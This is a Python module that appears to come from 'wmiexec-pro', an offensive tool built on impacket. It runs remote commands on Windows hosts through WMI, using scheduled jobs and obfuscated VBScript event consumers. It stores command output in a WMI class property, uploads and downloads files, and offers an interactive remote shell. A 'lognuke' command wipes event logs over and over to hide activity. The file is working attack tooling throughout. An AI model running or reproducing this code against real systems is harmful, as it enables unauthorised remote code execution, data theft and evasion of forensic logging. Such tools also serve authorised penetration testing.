import uuid
import time
import base64
import os
import sys
import datetime
import cmd
import re
import logging

from lib.modules.filetransfer import filetransfer_Toolkit
from lib.methods.classMethodEx import class_MethodEx
from lib.methods.executeVBS import executeVBS_Toolkit
from lib.methods.Obfuscator import VBSObfuscator
from impacket.dcerpc.v5.dtypes import NULL
from lib.helpers import get_vbs_path


class EXEC_COMMAND():
    def __init__(self, iWbemLevel1Login, codec):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.codec = codec
        self.timeout = 5
        self.obfu = VBSObfuscator()
        self.logger = logging.getLogger("wmiexec-pro")
        self.logger_countdown = logging.getLogger("CountdownLogger")
    
    def save_ToFile(self, hostname, content):
        path = os.path.join("save", hostname)
        save_FileName = f"{str(int(time.time()))}.txt"

        if not os.path.exists(path):
            os.makedirs(path, exist_ok=True)
        
        result = os.path.join(path, save_FileName)
        with open(result, "w") as f:
            f.write(content)

        self.logger.log(100, f"Save command result to {result}")

    # For system under NT6, like windows server 2003
    # Timer for countdown Win32_ScheduledJob, scheduled task in "Win32_ScheduledJob" only will be trigger every per minute.
    def timer_For_UnderNT6(self, iWbemServices=None, return_iWbemServices=False):
        if not iWbemServices:
            iWbemServices = self.iWbemLevel1Login.NTLMLogin("//./root/Cimv2", NULL, NULL)
            self.iWbemLevel1Login.RemRelease()

        iEnumWbemClassObject = iWbemServices.ExecQuery("SELECT * FROM Win32_LocalTime")
        LocalTime = iEnumWbemClassObject.Next(0xffffffff,1)[0]
        LocalTime = dict(LocalTime.getProperties())

        # Get remaining seconds until the next minute.
        for i in range((65 - int(LocalTime["Second"]["value"])),0,-1):
            self.logger_countdown.info(f"Waiting {i}s for command execution.\r")
            time.sleep(1)

        self.logger.log(100, "Command executed!")

        # Return cimv2
        if return_iWbemServices:
            return iWbemServices
    
    # For system under NT6, like windows server 2003
    def exec_command_silent_For_UnderNT6(self, command=None):
        iWbemServices = self.iWbemLevel1Login.NTLMLogin("//./root/Cimv2", NULL, NULL)
        self.iWbemLevel1Login.RemRelease()
        
        wql1 = "SELECT * FROM Win32_LocalTime"
        wql2 = "SELECT * FROM Win32_TimeZone"
        
        iEnumWbemClassObject = iWbemServices.ExecQuery(wql1)
        Win32_LocalTime = iEnumWbemClassObject.Next(0xffffffff, 1)[0]

        Machine_Date = datetime.datetime(100, 1, 1, int(Win32_LocalTime.Hour), int(Win32_LocalTime.Minute), 00)
        execute_time = (Machine_Date + datetime.timedelta(0, 60)).time() # Delay one miniute for command execution

        iEnumWbemClassObject = iWbemServices.ExecQuery(wql2)
        Win32_TimeZone = iEnumWbemClassObject.Next(0xffffffff, 1)[0]

        executeTime = "********{}.000000+{}".format(
            str(execute_time).replace(":", ""),
            str(Win32_TimeZone.Bias)
        )
        command = f"C:\\Windows\\System32\\cmd.exe /Q /c {command}"
        Win32_ScheduledJob, resp = iWbemServices.GetObject("Win32_ScheduledJob")
        result = Win32_ScheduledJob.Create(command, executeTime, 0, 0, 0, 1)
        if int(result.ReturnValue) == 0:
            self.logger.log(100, "Create schedule job for command execution successfully.")
        else:
            self.logger.error(f"Create schedule job for command execution error, code: {result.ReturnValue!s}")

        self.timer_For_UnderNT6(iWbemServices)

    def exec_command_silent(self, command, old=False):
        if "'" in command:
            command = command.replace("'", '"')

        if old:
            # Windows will auto remove job after schedule job executed.
            self.exec_command_silent_For_UnderNT6(command)
        else:
            executer = executeVBS_Toolkit(self.iWbemLevel1Login)
            random_TaskName = str(uuid.uuid4())

            self.logger.info("Executing command...(Sometime it will take a long time, please wait)")

            with open(get_vbs_path("Exec-Command-Silent.vbs")) as f:
                vbs = f.read()

            vbs = vbs.replace("REPLACE_WITH_COMMAND", base64.b64encode(command.encode("utf-8")).decode("utf-8")).replace("REPLACE_WITH_TASK", random_TaskName)
            
            # Experimental: use timer instead of filter query
            tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True)
            #filer_Query = r"SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            #tag = executer.ExecuteVBS(vbs_content=vbs, filer_Query=filer_Query, returnTag=True)
            
            # Wait 5 seconds for next step.
            for i in range(self.timeout,0,-1):
                self.logger_countdown.info(f"Waiting {i}s for next step.\r")
                time.sleep(1)
            
            executer.remove_Event(tag)

    def exec_command_WithOutput(self, command, ClassName_StoreOutput=None, save_Result=False, hostname=None, old=False):
        executer = executeVBS_Toolkit(self.iWbemLevel1Login)
        if not ClassName_StoreOutput:
            ClassName_StoreOutput = "Win32_OSRecoveryConfigurationDataBackup"

        FileName = f"windows-object-{uuid.uuid4()!s}.log"
        CMD_instanceID = str(uuid.uuid4())
        random_TaskName = str(uuid.uuid4())

        if "'" in command:
            command = command.replace("'", '"')

        # Reuse cimv2 namespace to avoid dcom limition
        class_Method = class_MethodEx(self.iWbemLevel1Login)
        iWbemServices_Reuse_cimv2, _ = class_Method.check_ClassStatus(ClassName=ClassName_StoreOutput, return_iWbemServices=True)

        self.logger.info("Executing command...(Sometime it will take a long time, please wait)")
        
        if old:
            # Experimental: use timer instead of filter query
            with open(get_vbs_path("Exec-Command-WithOutput-UnderNT6.vbs")) as f:
                vbs = f.read()
            vbs = vbs.replace("REPLACE_WITH_COMMAND", base64.b64encode(command.encode("utf-8")).decode("utf-8")).replace("REPLACE_WITH_FILENAME", FileName).replace("REPLACE_WITH_CLASSNAME", ClassName_StoreOutput).replace("RELEACE_WITH_UUID", CMD_instanceID)
            tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True)
            
            # Reuse cimv2
            iWbemServices_Reuse_cimv2 = self.timer_For_UnderNT6(iWbemServices=iWbemServices_Reuse_cimv2, return_iWbemServices=True)
        else:
            # Experimental: use timer instead of filter query
            with open(get_vbs_path("Exec-Command-WithOutput.vbs")) as f:
                vbs = f.read()
            vbs = vbs.replace("REPLACE_WITH_COMMAND", base64.b64encode(command.encode("utf-8")).decode("utf-8")).replace("REPLACE_WITH_FILENAME", FileName).replace("REPLACE_WITH_CLASSNAME", ClassName_StoreOutput).replace("RELEACE_WITH_UUID", CMD_instanceID).replace("REPLACE_WITH_TASK", random_TaskName)
            tag = executer.ExecuteVBS(vbs_content=self.obfu.generator(vbs), returnTag=True)
            #filer_Query = r"SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            #tag = executer.ExecuteVBS(vbs_content=vbs, filer_Query=filer_Query, returnTag=True)
            
            # Wait 5 seconds for next step.
            for i in range(self.timeout,0,-1):
                self.logger_countdown.info(f"Waiting {i}s for next step.\r")
                time.sleep(1)
        
        executer.remove_Event(tag)

        try:
            command_ResultObject, resp = iWbemServices_Reuse_cimv2.GetObject('{}.CreationClassName="{}"'.format(ClassName_StoreOutput, CMD_instanceID))
        except Exception as e:
            if "WBEM_E_INVALID_CLASS" in str(e):
                self.logger.error(f"Class {ClassName_StoreOutput} didn't existed!")
            elif "WBEM_E_NOT_FOUND" in str(e):
                self.logger.error("Get command results failed, probably you may need to increase interval time.")
            else:
                self.logger.error(f"Unexpected error: {e!s}")
        else:
            self.logger.info("Retrieving command results...")
            record = dict(command_ResultObject.getProperties())
            result = base64.b64decode(record["DebugOptions"]["value"]).decode(self.codec, errors="replace")
            self.logger.log(100, result)

        if save_Result and hostname:
            self.save_ToFile(hostname, result)
    
    def clear(self, ClassName_StoreOutput=None):
        # Can't remote delete file via CIM_DataFile class, not thing happened after invoke Delete method of instance.
        if not ClassName_StoreOutput:
            ClassName_StoreOutput = "Win32_OSRecoveryConfigurationDataBackup"

        executer = executeVBS_Toolkit(self.iWbemLevel1Login)
        class_Method = class_MethodEx(self.iWbemLevel1Login)

        self.logger.info("Cleanning temporary files and class.")

        with open(get_vbs_path("RemoveTempFile.vbs")) as f:
            vbs = f.read()
        tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True)
        
        # Wait 5 seconds for next step.
        for i in range(self.timeout,0,-1):
            self.logger_countdown.info(f"Waiting {i}s for next step.\r")
            time.sleep(1)

        executer.remove_Event(tag)

        class_Method.remove_Class(ClassName=ClassName_StoreOutput, return_iWbemServices_Cimv2=False)

class EXEC_COMMAND_SHELL(cmd.Cmd):
    def __init__(self, iWbemLevel1Login, dcom, codec, addr):
        cmd.Cmd.__init__(self)
        self.iWbemLevel1Login = iWbemLevel1Login
        self.dcom = dcom
        self.codec = codec
        self.hostname = addr
        self.ClassName_StoreOutput = "Win32_OSRecoveryConfigurationDataBackup"
        self.save_Path = os.path.join("save", self.hostname)
        self.save_fileName = f"{int(time.time())!s}.txt"
        self.logging = False
        self.interval = 5
        self.cwd = "C:\\Windows\\System32"
        self.prompt = f"{self.cwd}>"
        self.intro = "[!] Launching semi-interactive shell - Careful what you execute"
        self.history = []

        self.executer = executeVBS_Toolkit(self.iWbemLevel1Login)
        self.fileTransfer = filetransfer_Toolkit(self.iWbemLevel1Login, self.dcom)
        self.obfu = VBSObfuscator()

        self.logger = logging.getLogger("wmiexec-pro")
        self.logger_countdown = logging.getLogger("CountdownLogger")

        # Reuse cimv2 namespace to avoid dcom limition
        class_Method = class_MethodEx(self.iWbemLevel1Login)
        self.iWbemServices_Reuse_cimv2, self.iWbemServices_Reuse_subscription = class_Method.check_ClassStatus(self.ClassName_StoreOutput, return_iWbemServices=True)

    def do_help(self, line):
        print("""
 sleep {seconds}                - set interval time in command execution (default is 5 seconds).
 lognuke                        - enable looping cleaning eventlog.
 upload {src_file, dst_path}    - uploads a local file to the dst_path (dst_path = default current directory)
 download {src_file}            - downloads pathname to the current local dir
 logging                        - log everythings.
 codec {code}                   - set encoding code
 history                        - show history commands
 clear                          - clean the screen
 exit                           - exit.
""")
    
    def do_upload(self, params):
        import ntpath

        params = params.split(" ")
        if len(params) > 1:
            src_file = params[0]
            dst_path = params[1]
        elif len(params) == 1:
            src_file = params[0]
            dst_path = self.cwd

        filename = src_file.replace("\\", "/").split("/")[-1]
        dst_file = ntpath.join(ntpath.join(self.cwd, dst_path), filename)

        self.fileTransfer.uploadFile(src_File=src_file, dest_File=dst_file, iWbemServices_Subscription=self.iWbemServices_Reuse_subscription, iWbemServices_Cimv2=self.iWbemServices_Reuse_cimv2)

    def do_download(self, src_file):
        import ntpath

        newPath = ntpath.normpath(ntpath.join(self.cwd, src_file))
        drive, tail = ntpath.splitdrive(newPath)
        filename = ntpath.basename(tail)

        self.fileTransfer.downloadFile(target_File=newPath, save_Location=os.path.join(".", filename), iWbemServices_Subscription=self.iWbemServices_Reuse_subscription, iWbemServices_Cimv2=self.iWbemServices_Reuse_cimv2)

    def do_sleep(self, seconds):
        self.interval = int(seconds)
        self.logger.info(f"Set interval time to: {self.interval!s}")

    def do_lognuke(self, line):
        self.executer.ExecuteVBS(vbs_file="lib/vbscripts/ClearEventlog.vbs", iWbemServices=self.iWbemServices_Reuse_subscription)
        self.logger.log(100, "Nuke is landed and log cleaning will never stop before use '-deep-clean' in 'execute-vbs' module")

    def do_logging(self, line):
        self.logger.info(f"Start logging and save the result to: {os.path.join(self.save_Path, self.save_fileName)}")
        self.logging = True

    def do_codec(self, line):
        if all([line]):
            self.codec = line
            self.logger.log(100, f"Set encoding code to: {self.codec}")
        else:
            self.logger.info(f"Current encoding code: {self.codec}")
    
    def do_history(self, line):
        for i in range(0, len(self.history)):
            print(f"   {i+1!s}  {self.history[i]}")

    def do_clear(self, line):
        os.system("clear")

    def emptyline(self):
        return False

    def do_exit(self, line):
        self.dcom.disconnect()
        sys.exit(1)

    def interval_Timer(self, seconds):
        for i in range(seconds,0,-1):
            self.logger_countdown.info(f"Waiting {i}s for next step.\r")
            time.sleep(1)
        self.logger.log(100, "Results:\n")

    def save_ToFile(self, content):
        if not os.path.exists(self.save_Path):
            os.makedirs(self.save_Path, exist_ok=True)
        
        with open(os.path.join(self.save_Path, self.save_fileName), "a+") as f:
            f.write(content)

    def process_Result(self, result, command):
        tmp_list = re.split("\\[COMMAND\\]|\\[PATH\\]", result)
        self.cwd = tmp_list[2].strip("\r\n").lstrip()
        cmd_Result = tmp_list[1].strip("\r\n").lstrip()
        self.prompt = f"{self.cwd}>"
        print(f"{cmd_Result}\n")
        
        if self.logging:
            content = f"{self.prompt} {command}\r\n\r\n{cmd_Result}\r\n\r\n"
            self.save_ToFile(content)

    def default(self, line):
        # history
        self.history.append(line)

        FileName = f"windows-object-{uuid.uuid4()!s}.log"
        CMD_instanceID = str(uuid.uuid4())
        random_TaskName = str(uuid.uuid4())

        command = line
        if "'" in command:
            command = command.replace("'", '"')

        with open(get_vbs_path("Exec-Command-WithOutput-Shell.vbs")) as f:
            vbs = f.read()
        vbs = vbs.replace("REPLACE_WITH_CWD", base64.b64encode(self.cwd.encode("utf-8")).decode("utf-8")).replace("REPLACE_WITH_COMMAND", base64.b64encode(command.encode("utf-8")).decode("utf-8")).replace("REPLACE_WITH_FILENAME",  FileName).replace("REPLACE_WITH_CLASSNAME", self.ClassName_StoreOutput).replace("RELEACE_WITH_UUID", CMD_instanceID).replace("REPLACE_WITH_TASK", random_TaskName)
        # Reuse subscription namespace to avoid dcom limition
        
        vbs = self.obfu.generator(vbs)
        if not self.iWbemServices_Reuse_subscription:
            tag, self.iWbemServices_Reuse_subscription = self.executer.ExecuteVBS(vbs_content=vbs, returnTag=True, BlockVerbose=True, return_iWbemServices=True)
        else:
            tag, self.iWbemServices_Reuse_subscription = self.executer.ExecuteVBS(vbs_content=vbs, returnTag=True, BlockVerbose=True, iWbemServices=self.iWbemServices_Reuse_subscription ,return_iWbemServices=True)
        
        # Wait 5 seconds for next step.
        self.interval_Timer(self.interval)
        
        self.executer.remove_Event(tag, BlockVerbose=True, iWbemServices=self.iWbemServices_Reuse_subscription)

        try:
            command_ResultObject, resp = self.iWbemServices_Reuse_cimv2.GetObject(f'{self.ClassName_StoreOutput}.CreationClassName="{CMD_instanceID}"')
            record = dict(command_ResultObject.getProperties())
        except Exception as e:
            if "WBEM_E_NOT_FOUND" in str(e):
                self.logger.error("Get command results failed, probably you may need to increase interval time.")
            else:
                self.logger.error(f"Unknown error: {e!s}")
        else:
            result = base64.b64decode(record["DebugOptions"]["value"]).decode(self.codec, errors="replace")
            self.process_Result(result, line)
